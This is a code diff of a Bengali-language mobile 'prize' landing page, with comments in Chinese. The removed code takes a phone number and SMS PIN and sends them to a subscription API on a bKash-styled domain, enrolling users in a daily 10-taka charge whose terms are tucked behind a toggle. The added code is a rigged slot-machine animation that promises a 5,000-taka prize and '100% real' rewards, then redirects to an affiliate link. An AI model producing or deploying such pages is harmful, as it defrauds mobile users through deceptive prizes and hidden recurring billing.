@@ -12,6 +12,7 @@
             user-select: none;
             -webkit-tap-highlight-color: transparent;
         }
+        /* 禁止页面滚动 */
         html, body {
             width: 100%;
             height: 100%;
@@ -31,15 +32,16 @@
         .card {
             max-width: 440px;
             width: 100%;
-            max-height: 98vh;
+            max-height: 98vh;          /* 限制最大高度 */
             background: white;
             border-radius: 32px;
-            overflow-y: auto;
+            overflow-y: auto;           /* 如果内容过多，卡片内部滚动 */
             overflow-x: hidden;
             text-align: center;
             box-shadow: 0 20px 35px rgba(0,0,0,0.4);
             -webkit-overflow-scrolling: touch;
         }
+        /* 隐藏滚动条（可选，保持美观） */
         .card::-webkit-scrollbar {
             width: 4px;
         }
@@ -74,90 +76,28 @@
             margin: 15px 0;
         }
         .rolling-numbers {
-            font-size: 1.4rem;
-            font-weight: bold;
+            font-size: 2.8rem;
+            font-weight: 900;
+            font-family: monospace;
             background: #fff;
             padding: 16px;
             border-radius: 20px;
             border: 2px solid #e2e8f0;
             margin-bottom: 12px;
-            color: #1e293b;
-            line-height: 1.4;
-        }
-        .rolling-numbers span {
-            font-size: 2.2rem;
-            font-weight: 900;
             color: #e67e22;
+        }
+        .cost-badge {
+            background: #fef3c7;
             display: inline-block;
-            margin: 0 4px;
-        }
-        .offer-details {
-            background: #f8fafc;
-            border-radius: 20px;
-            padding: 12px 16px;
-            margin: 16px 0 0;
-            text-align: left;
+            padding: 5px 14px;
+            border-radius: 40px;
             font-size: 0.8rem;
-            line-height: 1.5;
-            color: #1e293b;
-        }
-        .offer-details p {
-            margin: 6px 0;
-        }
-        .offer-details strong {
+            font-weight: bold;
             color: #b45309;
+            margin-bottom: 12px;
         }
-        .trust-line {
-            font-size: 0.7rem;
-            text-align: center;
-            margin-top: 10px;
-            color: #2c6e2c;
-            background: #e6f7e6;
-            padding: 6px 12px;
-            border-radius: 30px;
-            display: flex;
-            justify-content: center;
-            gap: 12px;
-            flex-wrap: wrap;
-        }
-        .footer {
-            font-size: 0.6rem;
-            color: #94a3b8;
-            margin-top: 12px;
-            text-align: center;
-        }
-
-        /* ===== 新增 PIN API 样式 ===== */
-        .hidden {
-            display: none !important;
-        }
-
-        .form-group {
-            margin: 15px 0;
-        }
-        .form-group label {
-            display: block;
-            font-size: 0.9rem;
-            font-weight: 600;
-            color: #1e293b;
-            margin-bottom: 6px;
-        }
-        .form-group input {
-            width: 100%;
-            padding: 14px 16px;
-            font-size: 1.2rem;
-            border: 2px solid #e2e8f0;
-            border-radius: 12px;
-            text-align: center;
-            background: #f8fafc;
-            transition: border-color 0.2s;
-            outline: none;
-        }
-        .form-group input:focus {
-            border-color: #3A7CAE;
-        }
-
-        .btn-primary {
+        .btn-stop {
+            background: #408559;
             width: 100%;
             padding: 14px;
             border: none;
@@ -167,102 +107,76 @@
             color: white;
             cursor: pointer;
             transition: 0.1s ease;
-            background: #408559;
         }
-        .btn-primary:active {
+        .btn-stop:active {
             transform: scale(0.97);
         }
-        .btn-primary:disabled {
-            opacity: 0.6;
-            transform: none;
-        }
-
-        .pin-container {
-            display: flex;
-            justify-content: center;
-            gap: 12px;
-            margin: 15px 0;
-        }
-        .pin-box {
-            width: 60px;
-            height: 70px;
-            font-size: 2rem;
-            text-align: center;
-            border: 2px solid #e2e8f0;
-            border-radius: 12px;
+        /* 首页说明区域紧凑 */
+        .offer-details {
             background: #f8fafc;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-        .pin-box:focus {
-            border-color: #3A7CAE;
-        }
-
-        .error-msg {
-            color: #dc2626;
-            font-size: 0.85rem;
-            margin-top: 8px;
-            padding: 8px 12px;
-            background: #fef2f2;
-            border-radius: 8px;
-            display: none;
-        }
-        .error-msg.show {
-            display: block;
-        }
-
-        .loading-text {
-            color: #3A7CAE;
-            font-size: 0.9rem;
-            margin-top: 8px;
-            display: none;
-        }
-        .loading-text.show {
-            display: block;
-        }
-
-        .success-icon {
-            font-size: 4rem;
-            margin: 10px 0;
-        }
-        .success-title {
-            color: #408559;
-            font-size: 1.6rem;
-            font-weight: bold;
-        }
-
-        .tnc-toggle {
-            font-size: 0.75rem;
-            color: #64748b;
-            text-decoration: underline;
-            cursor: pointer;
-            margin-top: 10px;
-            display: inline-block;
-        }
-        .tnc-box {
-            display: none;
-            margin-top: 8px;
-            background: #f1f5f9;
-            border-radius: 10px;
-            padding: 12px 14px;
+            border-radius: 20px;
+            padding: 12px 16px;
+            margin: 16px 0 0;
             text-align: left;
-            font-size: 0.7rem;
-            color: #475569;
+            font-size: 0.8rem;
+            line-height: 1.4;
+            color: #1e293b;
         }
-        .tnc-box.open {
+        .offer-details p {
+            margin: 5px 0;
+        }
+        .offer-details strong {
+            color: #b45309;
+        }
+        .footer {
+            font-size: 0.65rem;
+            color: #94a3b8;
+            margin-top: 14px;
+            text-align: center;
+        }
+        /* 弹窗样式不变 */
+        .custom-toast {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.92);
+            backdrop-filter: blur(10px);
+            color: #ffd966;
+            padding: 20px 24px;
+            border-radius: 48px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            text-align: center;
+            z-index: 10000;
+            max-width: 85%;
+            width: auto;
+            white-space: normal;
+            word-break: break-word;
+            box-shadow: 0 0 25px rgba(0,0,0,0.6);
+            border: 1px solid #f59e0b;
+            line-height: 1.4;
+            font-family: 'Segoe UI', system-ui;
+            pointer-events: none;
+        }
+        .custom-toast span {
             display: block;
+            margin-top: 10px;
+            font-size: 0.85rem;
+            color: #ffaa66;
         }
-
+        /* 针对非常小的高度调整 */
         @media (max-height: 700px) {
             .header { padding: 12px 16px; }
             .prize-body { padding: 12px 16px 20px; }
             .slot-machine { padding: 12px; margin: 10px 0; }
-            .rolling-numbers { font-size: 1rem; padding: 12px; }
-            .rolling-numbers span { font-size: 1.6rem; }
-            .pin-box { width: 48px; height: 56px; font-size: 1.6rem; }
-            .btn-primary { padding: 12px; font-size: 1rem; }
+            .rolling-numbers { font-size: 2.2rem; padding: 12px; }
+            .btn-stop { padding: 12px; font-size: 1.1rem; }
+            .offer-details { font-size: 0.75rem; padding: 8px 12px; }
+            .footer { margin-top: 10px; }
         }
     </style>
+    
 </head>
 <body>
 <div class="card">
@@ -271,286 +185,92 @@
         <div class="subhead">আজকের ভাগ্যবান নির্বাচিত!</div>
     </div>
     <div class="prize-body">
-
-        <!-- ===== 初始游戏区域 ===== -->
-        <div id="gameSection">
-            <div class="slot-machine">
-                <div class="rolling-numbers">খরচ মাত্র এক কাপ চায়ের দাম, পুরস্কার <span id="rollingNumber">৫,০০০</span> টাকা!</div>
-                <button class="btn-primary" id="playBtn">🎯 পুরস্কার নিন</button>
-            </div>
-            <div class="offer-details">
-                <p>✅ সাবস্ক্রাইব → পুরস্কার নিন → সাথে সাথে বাতিল করুন</p>
-                <p>🎁 ২ মিনিটে পুরস্কার <strong>মোবাইল রিচার্জ</strong> হিসেবে পাবেন</p>
-                <p>⚠️ <strong>যেকোনো সময় বাতিল করতে পারবেন</strong> (সহজ ও দ্রুত)</p>
-            </div>
-            <div class="trust-line">
-                🔒 নিরাপদ লেনদেন | ✅ ১০০% বিশ্বস্ত | 🏆 প্রকৃত পুরস্কার
-            </div>
-            <div class="footer">সীমিত সময়ের অফার | শুধু গ্রাহকদের জন্য</div>
+        <div class="slot-machine">
+            <div class="rolling-numbers" id="rollingNumber">৳ ৫,০০০</div>
+            <div class="cost-badge">⭐ স্পিন করুন ⭐</div>
+            <button class="btn-stop" id="stopBtn">🛑 স্টপ করুন 🛑</button>
         </div>
 
-        <!-- ===== 手机号输入区域 (初始隐藏) ===== -->
-        <div id="phoneSection" class="hidden">
-            <h2 style="font-size:1.3rem; color:#1e293b; margin-bottom:6px;">📱 আপনার মোবাইল নম্বর লিখুন</h2>
-            <p style="font-size:0.85rem; color:#64748b;">একটি ৪-ডিজিটের কোড SMS আকারে আসবে</p>
-            <div class="form-group">
-                <input type="tel" id="msisdn" placeholder="94XXXXXXXXX" maxlength="15">
-            </div>
-            <button class="btn-primary" id="sendBtn">📨 কোড পাঠান</button>
-            <div id="phoneLoading" class="loading-text">⏳ পাঠানো হচ্ছে...</div>
-            <div id="phoneError" class="error-msg"></div>
-            <div class="trust-line" style="margin-top:12px; font-size:0.65rem;">
-                🔒 নিরাপদ লেনদেন | ✅ ১০০% বিশ্বস্ত
-            </div>
+        <div class="offer-details">
+            <p>📱পুরস্কার পেতে সাবস্ক্রাইব করুন:</p> 
+               💡  সেরা উপায় :  সাবস্ক্রাইব → পুরস্কার নিন → সাথে সাথে বাতিল করুন → মাত্র <strong>এক কাপ চায়ের দামে</strong> পুরস্কার নিন！<br>
+               ⚠️ মনে রাখবেন: সাবস্ক্রাইব করার পর যেকোনো সময় বাতিল করতে পারবেন<br>                
+            </p>
         </div>
-
-        <!-- ===== PIN码输入区域 (初始隐藏) ===== -->
-        <div id="pinSection" class="hidden">
-            <h2 style="font-size:1.3rem; color:#1e293b; margin-bottom:6px;">🔑 ৪-ডিজিটের কোড লিখুন</h2>
-            <p style="font-size:0.85rem; color:#64748b;">আপনার ফোনে SMS চেক করুন</p>
-            <div class="pin-container">
-                <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
-                <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
-                <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
-                <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
-            </div>
-            <button class="btn-primary" id="verifyBtn">✅ যাচাই করুন</button>
-            <div id="pinLoading" class="loading-text">⏳ যাচাই করা হচ্ছে...</div>
-            <div id="pinError" class="error-msg"></div>
-            <span class="tnc-toggle" onclick="toggleTnc()">শর্তাবলী ও নীতিমালা ▼</span>
-            <div class="tnc-box" id="tncBox">
-                PIN যাচাই করে আপনি প্রতিদিন ১০ টাকা সাবস্ক্রিপশনে সম্মতি দিচ্ছেন।
-                বাতিল করতে: C XG লিখে 85868 তে SMS পাঠান।
-            </div>
+        <div class="footer">
+            🏆 ১০০% প্রকৃত পুরস্কার | সীমিত সময়ের অফার | শুধু GP ব্যবহারকারীদের জন্য
         </div>
-
-        <!-- ===== 成功页面 (初始隐藏) ===== -->
-        <div id="successSection" class="hidden">
-            <div class="success-icon">🎉</div>
-            <div class="success-title">অভিনন্দন! অ্যাক্সেস মঞ্জুর!</div>
-            <p style="color:#475569; margin:10px 0;">আপনার পুরস্কার শিগগিরই মোবাইল রিচার্জ হিসেবে পাবেন।</p>
-            <button class="btn-primary" onclick="location.reload()">🔄 আবার চেষ্টা করুন</button>
-            <div class="footer" style="margin-top:12px;">
-                বাতিল করতে: C XG লিখে 85868 তে SMS পাঠান
-            </div>
-        </div>
-
     </div>
 </div>
 
 <script>
-// ============================================================
-// 【重要】每个 LP 只需修改这两行
-// ============================================================
-const API_BASE = 'https://bkashofferhub.top';        // ← 您的 Worker 域名
-const OFFER_ID = '291632';                           // ← AM 给您的 Offer ID
-// ============================================================
+    const prizes = ["৳ ৫,০০০", "৳ ২,০০০", "৳ ১,০০০", "৳ ৫০০"];
+    let rollingInterval = null;
+    const rollingDiv = document.getElementById('rollingNumber');
+    const stopBtn = document.getElementById('stopBtn');
 
-// 从 URL 获取 cid，用于追踪
-const cid = new URLSearchParams(location.search).get('cid') || ('direct_' + Date.now());
-let currentTxid = null;  // 保存 PIN Request 返回的 txid
+    function startRolling() {
+        if (rollingInterval) clearInterval(rollingInterval);
+        rollingInterval = setInterval(() => {
+            const randomIndex = Math.floor(Math.random() * prizes.length);
+            rollingDiv.innerText = prizes[randomIndex];
+        }, 60);
+    }
+    startRolling();
 
-// DOM 元素
-const gameSection = document.getElementById('gameSection');
-const phoneSection = document.getElementById('phoneSection');
-const pinSection = document.getElementById('pinSection');
-const successSection = document.getElementById('successSection');
+    function showToastMessage(message, duration = 2500) {
+        const toast = document.createElement('div');
+        toast.className = 'custom-toast';
+        toast.innerHTML = message;
+        document.body.appendChild(toast);
+        setTimeout(() => toast.remove(), duration);
+    }
 
-const msisdnInput = document.getElementById('msisdn');
-const sendBtn = document.getElementById('sendBtn');
-const phoneLoading = document.getElementById('phoneLoading');
-const phoneError = document.getElementById('phoneError');
-
-const pinBoxes = document.querySelectorAll('.pin-box');
-const verifyBtn = document.getElementById('verifyBtn');
-const pinLoading = document.getElementById('pinLoading');
-const pinError = document.getElementById('pinError');
-
-// ============================================================
-// 功能函数
-// ============================================================
-function show(id) { document.getElementById(id).classList.remove('hidden'); }
-function hide(id) { document.getElementById(id).classList.add('hidden'); }
-
-function showError(el, msg) {
-    el.textContent = msg;
-    el.classList.add('show');
-}
-function hideError(el) {
-    el.classList.remove('show');
-    el.textContent = '';
-}
-function showLoading(el) { el.classList.add('show'); }
-function hideLoading(el) { el.classList.remove('show'); }
-
-function toggleTnc() {
-    document.getElementById('tncBox').classList.toggle('open');
-}
-
-// ============================================================
-// 滚动数字动画
-// ============================================================
-const prizes = ["৫,০০০", "২,০০০", "১,০০০", "৫০০"];
-let rollingInterval = null;
-const rollingSpan = document.getElementById('rollingNumber');
-
-function startRolling() {
-    if (rollingInterval) clearInterval(rollingInterval);
-    rollingInterval = setInterval(() => {
-        const randomIndex = Math.floor(Math.random() * prizes.length);
-        rollingSpan.innerText = prizes[randomIndex];
-    }, 120);
-}
-startRolling();
-
-// ============================================================
-// 【改造点 1】点击 "পুরস্কার নিন" → 显示手机号输入
-// ============================================================
-document.getElementById('playBtn').addEventListener('click', function() {
-    hide('gameSection');
-    show('phoneSection');
-    msisdnInput.focus();
-});
-
-// ============================================================
-// 【改造点 2】PIN 输入框自动跳转
-// ============================================================
-pinBoxes.forEach((box, i) => {
-    box.addEventListener('input', () => {
-        box.value = box.value.replace(/\D/g, '');
-        if (box.value && i < pinBoxes.length - 1) {
-            pinBoxes[i + 1].focus();
+    function extractNumber(str) {
+        let cleaned = str.replace(/[,，]/g, '');
+        const match = cleaned.match(/\d+|[০-৯]+/);
+        if (!match) return 0;
+        let digits = match[0];
+        if (/[০-৯]/.test(digits)) {
+            const bengaliToArab = { '০':'0','১':'1','২':'2','৩':'3','৪':'4','৫':'5','৬':'6','৭':'7','৮':'8','৯':'9' };
+            let arabicStr = '';
+            for (let ch of digits) {
+                arabicStr += bengaliToArab[ch] || ch;
+            }
+            return parseInt(arabicStr, 10);
         }
+        return parseInt(digits, 10);
+    }
+
+    // 阿拉伯数字转孟加拉数字
+    function toBengaliNumber(num) {
+        const bengaliDigits = ['০','১','২','৩','৪','৫','৬','৭','৮','৯'];
+        return num.toString().split('').map(ch => {
+            const digit = parseInt(ch, 10);
+            return isNaN(digit) ? ch : bengaliDigits[digit];
+        }).join('');
+    }
+
+    stopBtn.addEventListener('click', function() {
+        if (rollingInterval) {
+            clearInterval(rollingInterval);
+            rollingInterval = null;
+        }
+        const finalPrizeText = rollingDiv.innerText;
+        const prizeValue = extractNumber(finalPrizeText);
+        const netProfit = prizeValue - 15;
+        const bengaliNetProfit = toBengaliNumber(netProfit);
+        
+        const toastMessage = `
+            🎉 এক কাপ চায়ের দামে ${finalPrizeText} টাকা পান। → নেট লাভ ${bengaliNetProfit} টাকা 🎉<br>
+            <span>⏳ ২ সেকেন্ড অপেক্ষা করুন...</span>
+        `;
+        showToastMessage(toastMessage, 2500);
+        
+        setTimeout(function() {
+            window.location.href = "https://gift-card.click/click";
+        }, 2600);
     });
-    box.addEventListener('keydown', e => {
-        if (e.key === 'Backspace' && !box.value && i > 0) {
-            pinBoxes[i - 1].focus();
-        }
-    });
-});
-
-// ============================================================
-// 【改造点 3】发送验证码
-// ============================================================
-sendBtn.addEventListener('click', async function() {
-    const msisdn = msisdnInput.value.trim();
-
-    // 简单格式校验：10-15位数字
-    if (!/^\d{10,15}$/.test(msisdn)) {
-        showError(phoneError, 'দয়া করে সঠিক নম্বর দিন (দেশের কোড সহ, যেমন 94XXXXXXXXX)');
-        return;
-    }
-
-    hideError(phoneError);
-    showLoading(phoneLoading);
-    sendBtn.disabled = true;
-
-    try {
-        const url = `${API_BASE}/api/pin/request?msisdn=${msisdn}&offer_id=${OFFER_ID}&cid=${cid}`;
-        const res = await fetch(url);
-        const data = await res.json();
-
-        if (data.success) {
-            currentTxid = data.txid;
-            hide('phoneSection');
-            show('pinSection');
-            pinBoxes[0].focus();
-        } else {
-            showError(phoneError, data.msg || 'কোড পাঠাতে ব্যর্থ হয়েছে। আবার চেষ্টা করুন।');
-        }
-    } catch (e) {
-        showError(phoneError, 'নেটওয়ার্ক সমস্যা। আপনার সংযোগ চেক করুন।');
-    } finally {
-        hideLoading(phoneLoading);
-        sendBtn.disabled = false;
-    }
-});
-
-// ============================================================
-// 【改造点 4】验证 PIN
-// ============================================================
-verifyBtn.addEventListener('click', async function() {
-    const pin = Array.from(pinBoxes).map(b => b.value).join('');
-
-    if (pin.length !== 4) {
-        showError(pinError, 'দয়া করে সম্পূর্ণ ৪-ডিজিটের কোড লিখুন।');
-        return;
-    }
-
-    hideError(pinError);
-    showLoading(pinLoading);
-    verifyBtn.disabled = true;
-
-    try {
-        const url = `${API_BASE}/api/pin/verify?txid=${currentTxid}&pin=${pin}`;
-        const res = await fetch(url);
-        const data = await res.json();
-
-        if (data.success) {
-            // stateCode 0 → 成功
-            hide('pinSection');
-            show('successSection');
-        } else if (data.processing) {
-            // stateCode 2 → 处理中，开始轮询
-            showError(pinError, '⏳ প্রক্রিয়াকরণ হচ্ছে, দয়া করে অপেক্ষা করুন...');
-            pollStatus();
-        } else {
-            // stateCode 1 → 失败
-            showError(pinError, data.msg || 'ভুল কোড। আবার চেষ্টা করুন।');
-            pinBoxes.forEach(b => b.value = '');
-            pinBoxes[0].focus();
-        }
-    } catch (e) {
-        showError(pinError, 'যাচাই করতে ব্যর্থ হয়েছে। আবার চেষ্টা করুন।');
-    } finally {
-        hideLoading(pinLoading);
-        verifyBtn.disabled = false;
-    }
-});
-
-// ============================================================
-// 【改造点 5】轮询状态 (stateCode 2)
-// ============================================================
-async function pollStatus(attempt = 0) {
-    if (attempt >= 10) {
-        showError(pinError, 'সাবস্ক্রিপশন প্রক্রিয়াকরণে বেশি সময় লাগছে।');
-        return;
-    }
-
-    await new Promise(r => setTimeout(r, 3000));
-
-    try {
-        const url = `${API_BASE}/api/pin/status?txid=${currentTxid}`;
-        const res = await fetch(url);
-        const data = await res.json();
-
-        if (data.status === 'subscribed') {
-            hide('pinSection');
-            show('successSection');
-        } else if (data.status === 'processing') {
-            pollStatus(attempt + 1);
-        } else {
-            showError(pinError, 'সাবস্ক্রিপশন ব্যর্থ হয়েছে। আবার চেষ্টা করুন।');
-        }
-    } catch (e) {
-        pollStatus(attempt + 1);
-    }
-}
-
-// 按 Enter 键提交
-msisdnInput.addEventListener('keydown', (e) => {
-    if (e.key === 'Enter') sendBtn.click();
-});
-pinBoxes.forEach((box, i) => {
-    box.addEventListener('keydown', (e) => {
-        if (e.key === 'Enter') verifyBtn.click();
-    });
-});
-
-console.log('🔧 PIN API LP 已加载');
-console.log('📡 API_BASE:', API_BASE);
-console.log('📋 OFFER_ID:', OFFER_ID);
-console.log('🔑 CID:', cid);
 </script>
 </body>
 </html>
